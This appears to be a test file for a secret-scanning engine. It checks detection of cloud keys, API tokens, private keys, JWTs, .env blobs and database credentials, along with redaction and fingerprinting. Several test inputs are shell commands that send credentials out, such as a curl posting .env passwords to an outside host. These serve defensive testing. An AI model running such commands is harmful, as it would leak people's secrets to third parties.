import { test } from "node:test";
import assert from "node:assert/strict";
import { scanSecrets, shannonEntropy } from "../engine/secrets.js";

test("aws access key id", () => {
  const f = scanSecrets('echo "AKIAIOSFODNN7EXAMPLE"');
  assert.ok(f.some((x) => x.id === "aws-access-key"));
});

test("findings are redacted — the full secret never appears in output", () => {
  const secret = "AKIAIOSFODNN7EXAMPLE";
  const f = scanSecrets(`export KEY=${secret}`);
  const hit = f.find((x) => x.id === "aws-access-key")!;
  assert.ok(hit);
  assert.equal(hit.preview.includes(secret), false);
  assert.match(hit.preview, /^AKIA…/);
  assert.equal(hit.length, secret.length);
});

test("github token", () => {
  const f = scanSecrets("git -c http.extraHeader=\"Authorization: token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234\" push");
  assert.ok(f.some((x) => x.id === "github-token"));
});

test("openai-style key", () => {
  const f = scanSecrets("export OPENAI_API_KEY=sk-proj-abcdefghij0123456789ABCDEFGHIJ");
  assert.ok(f.some((x) => x.id === "openai-key"));
});

test("slack token", () => {
  const f = scanSecrets("curl -H \"Authorization: Bearer xoxb-" +
    "123456789012-abcdefghijklmnop\" https://x.invalid/");
  assert.ok(f.some((x) => x.id === "slack-token"));
});

test("google api key", () => {
  const f = scanSecrets("curl -H \"X-Goog-Api-Key: AIzaSyA1234567890abcdefghijklmnopqrstuv\" https://maps.googleapis.com/x");
  assert.ok(f.some((x) => x.id === "google-api-key"));
});

test("private key block", () => {
  const f = scanSecrets("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk\n-----END OPENSSH PRIVATE KEY-----");
  assert.ok(f.some((x) => x.id === "private-key-block"));
});

test("jwt", () => {
  const f = scanSecrets("Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c");
  assert.ok(f.some((x) => x.id === "jwt"));
});

test("env blob: 4+ UPPER_SNAKE assignments", () => {
  const text = 'curl --data "DB_HOST=localhost\nDB_USER=admin\nDB_PASS=SuperSecret9\nAWS_REGION=us-east-1" http://x.top/';
  const f = scanSecrets(text);
  assert.ok(f.some((x) => x.id === "env-blob"));
});

test("generic keyword assignment with high entropy", () => {
  const f = scanSecrets("export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY");
  assert.ok(f.some((x) => x.id === "generic-secret-assignment"));
});

test("placeholders and low-entropy values are skipped", () => {
  assert.deepEqual(scanSecrets("token=${VAULT_SECRET}"), []);
  assert.deepEqual(scanSecrets("password=changeme"), []);
  assert.deepEqual(scanSecrets('api_key="helloworld"'), []);
});

test("db connection string creds", () => {
  const f = scanSecrets("psql postgres://admin:p4ssw0rdXyz99@db.internal.corp/prod");
  assert.ok(f.some((x) => x.id === "db-connection-creds"));
});

test("shannon entropy sanity", () => {
  assert.ok(shannonEntropy("aaaaaaaaaaaaaaaa") < 1);
  assert.ok(shannonEntropy("wJalrXUtnFEMI/K7MDENG/bPx") > 3.5);
});

test("env blob: 4+ UPPER_SNAKE constants with benign values do NOT fire (FP fix)", () => {
  const findings = scanSecrets("const MAX_RETRIES=3;\nconst TIMEOUT_MS=1000;\nconst MAX_POOL=8;\nconst BUF_SIZE=256;");
  assert.equal(findings.filter((f) => f.id === "env-blob").length, 0);
});

test("env blob: real .env content still fires with value evidence", () => {
  const text = "DB_HOST=localhost\nDB_USER=admin\nDB_PASS=Sup3rS3cretValue!\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG";
  const f = scanSecrets(text);
  const blob = f.find((x) => x.id === "env-blob");
  assert.ok(blob, "a real .env blob still fires");
  assert.match(blob!.description, /secret-like values/);
});

test("findings carry an irreversible fingerprint that distinguishes same-preview secrets", () => {
  const a = scanSecrets("token AKIAIOSFODNN7EXAMPLE");
  const b = scanSecrets("token AKIAIOSFODNN7EXAMPLF");
  const fa = a.find((x) => x.id === "aws-access-key")!;
  const fb = b.find((x) => x.id === "aws-access-key")!;
  assert.equal(fa.preview, fb.preview, "same 4-char prefix and length");
  assert.notEqual(fa.fingerprint, fb.fingerprint, "fingerprints distinguish them");
  assert.match(fa.fingerprint, /^[0-9a-f]{16}$/);
  const again = scanSecrets("token AKIAIOSFODNN7EXAMPLE");
  assert.equal(again.find((x) => x.id === "aws-access-key")!.fingerprint, fa.fingerprint, "stable for the same value");
});
